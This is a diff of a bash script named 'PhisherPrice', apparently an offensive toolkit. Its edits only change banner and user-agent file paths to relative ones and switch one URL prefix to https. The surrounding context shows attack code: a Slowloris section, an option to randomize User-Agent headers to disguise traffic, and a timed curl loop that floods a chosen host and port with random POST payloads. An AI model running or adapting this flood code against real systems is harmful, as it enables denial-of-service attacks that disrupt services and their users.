@@ -91,12 +91,12 @@ colors=(
     "$(tput sgr0)"
 )
 banner_files=(
-    "/usr/local/bin/phisherprice/main/banners/banner1.txt"
-    "/usr/local/bin/phisherprice/main/banners/banner2.txt"
-    "/usr/local/bin/phisherprice/main/banners/banner3.txt"
-    "/usr/local/bin/phisherprice/main/banners/banner4.txt"
-    "/usr/local/bin/phisherprice/main/banners/banner5.txt"
-    "/usr/local/bin/phisherprice/main/banners/banner6.txt"
+    "./main/banners/banner1.txt"
+    "./main/banners/banner2.txt"
+    "./main/banners/banner3.txt"
+    "./main/banners/banner4.txt"
+    "./main/banners/banner5.txt"
+    "./main/banners/banner6.txt"
 )
 title="PhisherPrice"
 echo -e '\033]2;'$title'\007'
@@ -993,10 +993,10 @@ echo ' '
       23)
         clear
 # Define the URL prefix
-url_prefix="http://"
+url_prefix="https://"
 
 # Read the user agents from the file
-user_agents=$(cat user_agents.txt)
+user_agents=$(cat ./user_agents.txt)
 # Clear the cli
 clear
 
@@ -3210,7 +3210,7 @@ read -r -p"└─────► $reset" choice
     echo ""
 
 # Read user agents from file
-    user_agents=$(cat user_agents.txt)
+    user_agents=$(cat ./user_agents.txt)
 
 # Check for Slowloris attack
     echo "Checking for Slowloris ${yellow}attack...${reset}"
@@ -3263,7 +3263,7 @@ fi
     read -p "Randomize User-Agent header? [y/n]: " randomize_ua
 
     if [[ $randomize_ua == "y" ]]; then
-      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+      ua_flag="-H 'User-Agent: \$(shuf -n 1 ./user_agents.txt)'"
     else
       ua_flag=""
     fi
@@ -3378,7 +3378,7 @@ while [ $SECONDS -lt $endtime ]; do
     headers+="\r\n$header_name: $header_value"
   done
   payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
-  user_agent=$(shuf -n 1 user_agents.txt)
+  user_agent=$(shuf -n 1 ./user_agents.txt)
   curl -A "$user_agent" -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
   echo "Sent request at $(date)"
 done
